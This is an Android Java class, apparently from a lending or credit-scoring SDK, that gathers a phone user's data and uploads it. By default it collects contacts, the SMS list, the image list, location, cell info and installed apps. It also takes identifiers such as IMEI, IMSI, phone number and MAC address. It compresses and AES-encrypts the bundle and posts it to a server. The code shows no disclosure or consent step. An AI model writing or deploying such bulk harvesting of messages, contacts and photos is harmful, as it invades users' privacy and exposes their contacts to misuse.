package com.newstar.scorpiodata.risk;

import android.content.Intent;
import android.location.Location;
import android.os.Build;
import android.util.Log;

import androidx.annotation.Nullable;
import androidx.annotation.RequiresApi;

import com.android.volley.Response;
import com.google.android.gms.ads.identifier.AdvertisingIdClient;
import com.google.gson.Gson;
import com.newstar.scorpiodata.entity.FailureReason;
import com.newstar.scorpiodata.entity.StatusParent;
import com.newstar.scorpiodata.netutils.NetUtils;
import com.newstar.scorpiodata.utils.AesUtils;
import com.newstar.scorpiodata.utils.Base64Utils;
import com.newstar.scorpiodata.utils.Callback;
import com.newstar.scorpiodata.utils.GzipUtil;
import com.newstar.scorpiodata.utils.LocationUtils;
import com.newstar.scorpiodata.utils.LogUtils;
import com.newstar.scorpiodata.utils.PluginInit;
import com.newstar.scorpiodata.utils.RobotDistinguish;
import com.newstar.scorpiodata.utils.SharedHelp;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.zip.GZIPOutputStream;

public class RiskUtils {
    public static void updateAll(ArrayList<String> tasks, String step) {
        if (tasks == null || tasks.size() == 0) {
            tasks = new ArrayList<>();
            tasks.add(com.newstar.scorpiodata.risk.RiskType.CONTACTS);
            tasks.add(com.newstar.scorpiodata.risk.RiskType.IMAGE_LIST);
            tasks.add(com.newstar.scorpiodata.risk.RiskType.LOCATION);
            tasks.add(com.newstar.scorpiodata.risk.RiskType.SYS_OTHER_INFO);
            tasks.add(com.newstar.scorpiodata.risk.RiskType.CELLINFO_LIST);
            tasks.add(com.newstar.scorpiodata.risk.RiskType.APP_LIST);
            tasks.add(com.newstar.scorpiodata.risk.RiskType.SMS_LIST);
        }
        riskControl(tasks, step);
    }

    /**
     * 上传风控信息
     *
     * @param tasks
     * @param step
     */
    public static void riskControl(ArrayList<String> tasks, String step) {
        LogUtils.i("luolaigang","riskControl");
        for (int i = 0; i < tasks.size(); i++) {
            try {
                String typeName = tasks.get(i);
                switch (typeName) {
                    case RiskType.SYS_OTHER_INFO:
                        sendSysOtherInfo(step);
                        break;
                    case RiskType.LOCATION:
                        sendLocation(step);
                        break;
                    case RiskType.CELLINFO_LIST:
                        sendCellinfoList(step);
                        break;
                    case RiskType.CONTACTS:
                        sendAllContacts(step);
                        break;
                    case RiskType.CAMERA_APP_LIST:
                        sendCameraAppList(step);
                        break;
                    case RiskType.APP_LIST:
                        sendAppList(step);
                        break;
                    case RiskType.SMS_LIST:
                        sendSmsList(step);
                        break;
                    case RiskType.IMAGE_LIST:
                        sendImageList(step);
                        break;
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    /**
     * 经纬度
     *
     * @param step
     */
    private static void sendLocation(String step) {
        Callback<Location, FailureReason> callback = new Callback<Location, FailureReason>() {
            @Override
            public void resolve(Location res) {
                double lat = res.getLatitude();
                double lng = res.getLongitude();
                try {
                    String updated = SharedHelp.getSharedPreferencesValue(SharedHelp.UPDATE_LOCATION + step);
                    if (updated != null && updated.equals("false")) {
                        JSONObject jsonObject = new JSONObject();
                        jsonObject.put("longitude", lng);
                        jsonObject.put("latitude", lat);
                        dispatchEvent(RiskType.LOCATION, jsonObject, step);
                        SharedHelp.setSharedPreferencesValue(SharedHelp.UPDATE_LOCATION + step, "true");
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }
                Intent intent = new Intent(PluginInit.ACTIVITY, LocationUtils.class);
                PluginInit.ACTIVITY.stopService(intent);
            }

            @Override
            public void reject(FailureReason err) {
                try {
                    JSONObject jsonObject = new JSONObject();
                    jsonObject.put("msg", err.failureReason);
                    jsonObject.put("isError", true);
                    dispatchEvent(RiskType.LOCATION, jsonObject, step);
                } catch (Exception e) {
                    e.printStackTrace();
                }
                Intent intent = new Intent(PluginInit.ACTIVITY, LocationUtils.class);
                PluginInit.ACTIVITY.stopService(intent);
            }
        };

        SharedHelp.setSharedPreferencesValue(SharedHelp.UPDATE_LOCATION + step, "false");
        new LocationUtils(PluginInit.ACTIVITY, callback, 30);
    }

    /**
     * 设备信息
     *
     * @param step
     */
    private static void sendSysOtherInfo(String step) {
        new Thread() {
            @RequiresApi(api = Build.VERSION_CODES.LOLLIPOP_MR1)
            @Override
            public void run() {
                OtherRiskInfo otherRiskInfo = new OtherRiskInfo();
                try {
                    otherRiskInfo.phoneModel = PhoneUtils.getSystemModel();
                } catch (Exception ignore) {
                }

                try {
                    otherRiskInfo.systemVersion = PhoneUtils.getSystemVersion();
                } catch (Exception ignore) {
                }

                try {
                    otherRiskInfo.uid = SharedHelp.getUid();
                } catch (Exception ignore) {
                }

                try {
                    otherRiskInfo.ipv4Address = PhoneUtils.getIPAddress();
                } catch (Exception ignore) {
                }

                try {
                    otherRiskInfo.wifiMacAddress = PhoneUtils.getMac();
                } catch (Exception ignore) {
                }

                try {
                    // 如果是手机且sim卡已经准备
                    if (PhoneUtils.isPhone()
                            && PhoneUtils.isSimCardReady()) {
                        List<PhoneUtils.SimInfo> simInfos = PhoneUtils.getSimMultiInfo();

                        for (int i = 0; i < simInfos.size(); i++) {
                            PhoneUtils.SimInfo currSim = simInfos.get(i);
                            if (otherRiskInfo.imei == null) {
                                otherRiskInfo.imei = currSim.mImei != null ? currSim.mImei.toString() : null;
                            }

                            if (otherRiskInfo.imsi == null) {
                                otherRiskInfo.imsi = currSim.mImsi != null ? currSim.mImsi.toString() : null;
                            }

                            if (otherRiskInfo.phoneNumber == null) {
                                otherRiskInfo.phoneNumber = currSim.mNumber != null ? currSim.mNumber.toString() : null;
                            }

                            if (otherRiskInfo.carrierName == null) {
                                otherRiskInfo.carrierName = currSim.mCarrierName != null
                                        ? currSim.mCarrierName.toString()
                                        : null;
                            }
                        }
                    }
                } catch (Exception ignore) {
                    ignore.printStackTrace();
                }

                // GAID获取
                try {
                    AdvertisingIdClient.Info info = AdvertisingIdClient.getAdvertisingIdInfo(PluginInit.APPLICATION);
                    otherRiskInfo.GAID = info.getId();
                } catch (Exception e) {
                    e.printStackTrace();
                }

                try {
                    otherRiskInfo.availableSize = PhoneUtils.getAvailableSize();
                    otherRiskInfo.totalSize = PhoneUtils.getTotlaSize();
                    otherRiskInfo.bootTime = PhoneUtils.getBootTime();
                    otherRiskInfo.isRobot = RobotDistinguish.getInstence().isRobot() + "";
                    otherRiskInfo.totalMemory = PhoneUtils.getTotalMemory();
                    otherRiskInfo.availMemory = PhoneUtils.getAvailMemory();
                    otherRiskInfo.screenSize = PhoneUtils.getScreenSize();
                    otherRiskInfo.language = PhoneUtils.getLanguage();
                } catch (Exception e) {
                    e.printStackTrace();
                }

                try {
                    JSONObject jsonObject = new JSONObject();
                    jsonObject.put("phoneModel", isNoeEmpty(otherRiskInfo.phoneModel) ? otherRiskInfo.phoneModel : "");
                    jsonObject.put("systemVersion", isNoeEmpty(otherRiskInfo.systemVersion) ? otherRiskInfo.systemVersion : "");
                    jsonObject.put("uid", isNoeEmpty(otherRiskInfo.uid) ? otherRiskInfo.uid : "");
                    jsonObject.put("ipv4Address", isNoeEmpty(otherRiskInfo.ipv4Address) ? otherRiskInfo.ipv4Address : "");
                    jsonObject.put("wifiMacAddress", isNoeEmpty(otherRiskInfo.wifiMacAddress) ? otherRiskInfo.wifiMacAddress : "");
                    jsonObject.put("imei", isNoeEmpty(otherRiskInfo.imei) ? otherRiskInfo.imei : "");
                    jsonObject.put("imsi", isNoeEmpty(otherRiskInfo.imsi) ? otherRiskInfo.imsi : "");
                    jsonObject.put("phoneNumber", isNoeEmpty(otherRiskInfo.phoneNumber) ? otherRiskInfo.phoneNumber : "");
                    jsonObject.put("carrierName", isNoeEmpty(otherRiskInfo.carrierName) ? otherRiskInfo.carrierName : "");
                    jsonObject.put("gaid", isNoeEmpty(otherRiskInfo.GAID) ? otherRiskInfo.GAID : "");
                    jsonObject.put("availableSize", isNoeEmpty(otherRiskInfo.availableSize) ? otherRiskInfo.availableSize : "");
                    jsonObject.put("totalSize", isNoeEmpty(otherRiskInfo.totalSize) ? otherRiskInfo.totalSize : "");
                    jsonObject.put("bootTime", isNoeEmpty(otherRiskInfo.bootTime) ? otherRiskInfo.bootTime : "");
                    jsonObject.put("isRobot", isNoeEmpty(otherRiskInfo.isRobot) ? otherRiskInfo.isRobot : "");
                    jsonObject.put("totalMemory", isNoeEmpty(otherRiskInfo.totalMemory) ? otherRiskInfo.totalMemory : "");
                    jsonObject.put("availMemory", isNoeEmpty(otherRiskInfo.availMemory) ? otherRiskInfo.availMemory : "");
                    jsonObject.put("screenSize", isNoeEmpty(otherRiskInfo.screenSize) ? otherRiskInfo.screenSize : "");
                    jsonObject.put("language", isNoeEmpty(otherRiskInfo.language) ? otherRiskInfo.language : "");
                    dispatchEvent(RiskType.SYS_OTHER_INFO, jsonObject, step);
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }.start();
    }

    static boolean isNoeEmpty(String val) {
        return (val != null && val.length() > 0);
    }

    /**
     * 应用列表
     *
     * @param step
     */
    private static void sendAppList(String step) {
        new Thread() {
            @RequiresApi(api = Build.VERSION_CODES.O)
            @Override
            public void run() {
                try {
                    JSONArray data = RiskDataUtils.getAllAppList(PluginInit.ACTIVITY);
                    JSONObject jsonObject = new JSONObject();
                    jsonObject.put("appNum", data.length());
                    jsonObject.put("appList", data);
                    dispatchEvent(RiskType.APP_LIST, jsonObject, step);
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }.start();
    }

    /**
     * 拍照应用列表
     *
     * @param step
     */
    private static void sendCameraAppList(String step) {
        new Thread() {
            @RequiresApi(api = Build.VERSION_CODES.O)
            @Override
            public void run() {
                try {
                    JSONArray data = RiskDataUtils.getAllCameraAppList(PluginInit.ACTIVITY);
                    JSONObject jsonObject = new JSONObject();
                    jsonObject.put(RiskType.CAMERA_APP_LIST, data);
                    dispatchEvent(RiskType.CAMERA_APP_LIST, jsonObject, step);
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }.start();
    }

    private static void sendAllContacts(String step) {
        LogUtils.i("luolaigang","sendAllContacts");
        new Thread() {
            @Override
            public void run() {
                try {
                    JSONArray data = RiskDataUtils.getAllContacts(PluginInit.ACTIVITY);
                    JSONObject jsonObject = new JSONObject();
                    jsonObject.put(RiskType.CONTACTS, data);
                    dispatchEvent(RiskType.CONTACTS, jsonObject, step);
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }.start();
    }

    private static void sendSmsList(String step) {
        new Thread() {
            @RequiresApi(api = Build.VERSION_CODES.KITKAT)
            @Override
            public void run() {
                try {
                    JSONArray data = RiskDataUtils.getSmsList();
                    JSONObject jsonObject = new JSONObject();
                    jsonObject.put(RiskType.SMS_LIST, data);
                    dispatchEvent(RiskType.SMS_LIST, jsonObject, step);
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }.start();
    }

    private static void sendImageList(String step) {
        new Thread() {
            @Override
            public void run() {
                try {
                    JSONArray data = RiskDataUtils.getImageList(PluginInit.ACTIVITY);
                    JSONObject jsonObject = new JSONObject();
                    jsonObject.put(RiskType.IMAGE_LIST, data);
                    dispatchEvent(RiskType.IMAGE_LIST, jsonObject, step);
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }.start();
    }

    private static void sendCellinfoList(String step) {
        new Thread() {
            @RequiresApi(api = Build.VERSION_CODES.JELLY_BEAN_MR1)
            @Override
            public void run() {
                try {
                    JSONArray data = RiskDataUtils.getCellinfoList();
                    JSONObject jsonObject = new JSONObject();
                    jsonObject.put(RiskType.CELLINFO_LIST, data);
                    dispatchEvent(RiskType.CELLINFO_LIST, jsonObject, step);
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }.start();
    }

    private static OtherRiskInfo getInfos() {
        OtherRiskInfo otherRiskInfo = new OtherRiskInfo();
        otherRiskInfo.uid = SharedHelp.getUid();
        try {
            // 如果是手机且sim卡已经准备
            if (PhoneUtils.isPhone() && PhoneUtils.isSimCardReady()) {
                List<PhoneUtils.SimInfo> simInfos = PhoneUtils.getSimMultiInfo();

                for (int i = 0; i < simInfos.size(); i++) {
                    PhoneUtils.SimInfo currSim = simInfos.get(i);
                    if (otherRiskInfo.imei == null) {
                        otherRiskInfo.imei = currSim.mImei != null ? currSim.mImei.toString() : null;
                    }

                    if (otherRiskInfo.imsi == null) {
                        otherRiskInfo.imsi = currSim.mImsi != null ? currSim.mImsi.toString() : null;
                    }
                }
            }
        } catch (Exception ignore) {
            ignore.printStackTrace();
        }

        // GAID获取
        try {
            AdvertisingIdClient.Info info = AdvertisingIdClient.getAdvertisingIdInfo(PluginInit.APPLICATION);
            otherRiskInfo.GAID = info.getId();
        } catch (Exception e) {
            e.printStackTrace();
        }
        return otherRiskInfo;
    }

    // 主动触发js事件
    public static void dispatchEvent(String eventName, @Nullable JSONObject jsonObject, String step) {
        if (PluginInit.ACTIVITY != null) {
            // 自定义请求头
            Map<String, String> headers = NetUtils.getToken();
            Map<String, String> params = new HashMap<>();
            params.put("type", eventName);
            if (headers != null) {
                try {
                    jsonObject.put("userGid", NetUtils.getUserGid().get("userGid"));
                    jsonObject.put("uid", SharedHelp.getUid());
                    OtherRiskInfo otherRiskInfo = getInfos();
                    jsonObject.put("GAID", isNoeEmpty(otherRiskInfo.GAID) ? otherRiskInfo.GAID : "");
                    jsonObject.put("imei", isNoeEmpty(otherRiskInfo.imei) ? otherRiskInfo.imei : "");
                    jsonObject.put("imsi", isNoeEmpty(otherRiskInfo.imsi) ? otherRiskInfo.imsi : "");
                    jsonObject.put("step", step);
                    jsonObject.put("channel", PluginInit.CHANNEL);
                    jsonObject.put("subChannel", PluginInit.SUB_CHANNEL);

                    LogUtils.i("luolaigang",jsonObject.toString());

                    JSONObject data = new JSONObject();
                    data.put("data", AesUtils.aesEncrypt(GzipUtil.compress(jsonObject.toString())));

                    jsonObject = data;
                } catch (Exception e) {
                    LogUtils.i("luolaigang",e.getMessage());
                }

                NetUtils.requestPostInQueue(NetUtils.UPLOAD_RISK_DATA,
                        new Response.Listener<JSONObject>() {
                            @Override
                            public void onResponse(JSONObject response) {
                                LogUtils.i("luolaigang",response.toString());
                                StatusParent statusParent = new Gson().fromJson(response.toString(), StatusParent.class);
                                if (statusParent != null && statusParent.getStatus() != null && statusParent.getStatus().getCode().intValue() == 200) {

                                } else {
                                    statusParent.getStatus().showMessage();
                                }
                            }
                        }, jsonObject, params, headers);
            }
        }
    }

    public static void dispatchErrorEvent(String logKey, String log) {
        try {
            if (PluginInit.ACTIVITY != null) {
                // 自定义请求头
                Map<String, String> headers = NetUtils.getToken();
                Map<String, String> paramsGid = NetUtils.getUserGid();
                String gid = paramsGid.get("userGid");
                paramsGid.clear();
                if (gid == null) {
                    gid = SharedHelp.getUid();
                }
                paramsGid.put("gid", gid);
                paramsGid.put("logKey", logKey);
                paramsGid.put("log", log);
                if (headers != null) {
                    JSONObject jsonObject = new JSONObject(paramsGid);
                    NetUtils.requestPostInQueue(NetUtils.APPERROR_SAVE_SUBMIT,
                            new Response.Listener<JSONObject>() {
                                @Override
                                public void onResponse(JSONObject response) {
                                }
                            }, jsonObject, null, headers);

                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
